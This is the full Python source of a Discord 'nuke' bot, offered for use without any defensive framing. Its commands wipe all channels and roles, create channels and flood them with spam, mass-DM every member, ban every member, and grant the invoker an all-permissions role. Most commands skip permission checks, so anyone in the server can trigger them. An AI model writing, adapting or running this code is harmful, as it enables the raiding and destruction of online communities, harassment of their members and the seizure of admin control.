# packages
import discord
from discord.ext import commands
import asyncio
from dotenv import load_dotenv
import os
import requests
from io import BytesIO
import inspect

# config
load_dotenv()

config = {
    "Token": os.getenv("TOKEN"),
    "Prefix": os.getenv("PREFIX", "."),
    "Status": os.getenv("STATUS", "your server"),
}

# intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=config["Prefix"], intents=intents)

# logging variables
system = "\033[94m[SYSTEM]\033[0m"
err = "\033[91m[ERROR]\033[0m"
info = "\033[93m[INFO]\033[0m"
success = "\033[92m[SUCCESS]\033[0m"


# events
@bot.event
async def on_ready():
    print(f"{system} Logged in as {bot.user} ({bot.user.id})")
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.watching, name=config["Status"]
        ),
    )
    print(f"{system} Set status to 'Watching {config['Status']}'")

    print(
        f"{system} Invite: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=157712&scope=bot"
    )

    print("\n----LOGS----\n")


@bot.event
async def on_command(ctx):
    print(
        f"{info} {ctx.author.name} has attempted to run command '{config['Prefix']}{ctx.command.name}' in #{ctx.channel.name} - {ctx.guild.name} ({ctx.guild.id})"
    )


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument) or isinstance(
        error, commands.BadArgument
    ):
        parameters = ctx.command.clean_params

        message = f"Error in command '{ctx.command.qualified_name}':\n```"

        for paramName, param in parameters.items():
            status = "required" if param.default is inspect._empty else "optional"
            message += f"- {paramName}: {status}\n"

        message += "```"

        await ctx.send(message)

    else:
        await ctx.send(error)

    print(f"{err} {error}")


# commands
@bot.command()
async def nuke(ctx, channelCount, messages, channelName, *, message):
    await ctx.send("Starting nuke...")

    await editserver(ctx, channelName)

    await deletechannels(ctx)

    for i in range(int(channelCount)):
        try:
            channel = await ctx.guild.create_text_channel(name=channelName)
            print(
                f"{info} Created channel '{channelName}' in {ctx.guild.name} ({ctx.guild.id})"
            )

            for j in range(int(messages)):
                await channel.send(message)
                print(
                    f"{info} Sent message '{message}' in channel '{channelName}' - {ctx.guild.name} ({ctx.guild.id})"
                )
        except Exception as error:
            print(
                f"Couldn't create channel {channelName} in {ctx.guild.name} ({ctx.guild.id}): {error}"
            )

    print(f"{success} Nuke has finished in {ctx.guild.name} ({ctx.guild.id})")


@bot.command()
async def dm(ctx, amount, *, alert):
    message = await ctx.send("Starting mass DM...")
    for i in range(int(amount)):
        for member in ctx.guild.members:
            try:
                await member.send(alert)
                print(
                    f"{info} Sent message {alert} to {member.display_name} ({member.id})."
                )
            except Exception as error:
                print(
                    f"{err} Couldn't send message {alert} to {member.display_name} ({member.id}): {error}"
                )

    await message.delete()
    print(f"{success} Mass DM has finished in {ctx.guild.name} ({ctx.guild.id})")


@bot.command()
@commands.has_permissions(ban_members=True)
async def banall(ctx):
    if ctx.guild.get_member(bot.user.id).guild_permissions.ban_members == False:
        print("{err} Bot does not have ban permissions")
        return

    message = await ctx.send("Starting mass ban...")

    for member in ctx.guild.members:
        try:
            await ctx.guild.ban(member)
            print(
                f"{success} Succesfully banned user {member.name} ({member.id}) in {ctx.guild.name} ({ctx.guild.id})"
            )

        except Exception as error:
            print(
                f"{err} Failed to ban {member.name} ({member.id}) in {ctx.guild.name} ({ctx.guild.id}): {error}"
            )

    await message.delete()
    print(f"{success} Mass ban has finished in {ctx.guild.name} ({ctx.guild.id})")


@bot.command()
async def deleteroles(ctx):
    message = await ctx.send("Starting mass role deletion...")
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(
                f"{info} Administrator role '{role.name}' has been deleted in {ctx.guild.name} ({ctx.guild.id})"
            )
        except Exception as error:
            print(
                f"{err} Failed to delete role {role.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
            )

    await message.delete()
    print(
        f"{success} Mass role deletion has finished in {ctx.guild.name} ({ctx.guild.id})"
    )


@bot.command()
async def hoist(ctx, name):
    try:
        role = await ctx.guild.create_role(
            name=name, permissions=discord.Permissions.all()
        )
        await ctx.author.add_roles(role)

        print(
            f"{success} Role '{role.name}' has been succesfully given to {ctx.author.name} ({ctx.author.id}) in {ctx.guild.name} ({ctx.guild.id})"
        )
        message = await ctx.send(
            f"You have succesfully been given the role <@&{role.id}>"
        )

        await asyncio.sleep(3)
        await message.delete()
    except Exception as error:
        print(
            f"{err} Failed to give role {role.name} to {ctx.author.name} ({ctx.author.id}) in {ctx.guild.name} ({ctx.guild.id}): {error}"
        )


@bot.command()
async def deletechannels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(
                f"{info} Deleted channel {channel.name} in {ctx.guild.name} ({ctx.guild.id})"
            )

        except Exception as error:
            print(
                f"{err} Couldn't delete channel {channel.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
            )

    print(
        f"{success} All channels have been deleted in {ctx.guild.name} ({ctx.guild.id})"
    )


@bot.command()
async def editserver(ctx, name, logo=""):
    try:
        await ctx.guild.edit(name=name)

        if logo == "":
            data = None

        else:
            response = requests.get(logo)
            data = BytesIO(response.content).read()

        await ctx.guild.edit(icon=data)

        print(
            f"{success} Guild data succesfully changed for {ctx.guild.name} ({ctx.guild.id})"
        )

    except Exception as error:
        print(
            f"{err} Guild data could not be changed for {ctx.guild.name} ({ctx.guild.id}): {error}"
        )


bot.remove_command("help")


@bot.command()
async def help(ctx):
    commands = [f"{config['Prefix']}{command.name}" for command in bot.commands]

    embed = discord.Embed(title="Help", description="Help :3")
    embed.add_field(name="Commands", value="\n".join(commands))

    await ctx.send(embed=embed)


bot.run(config["Token"])
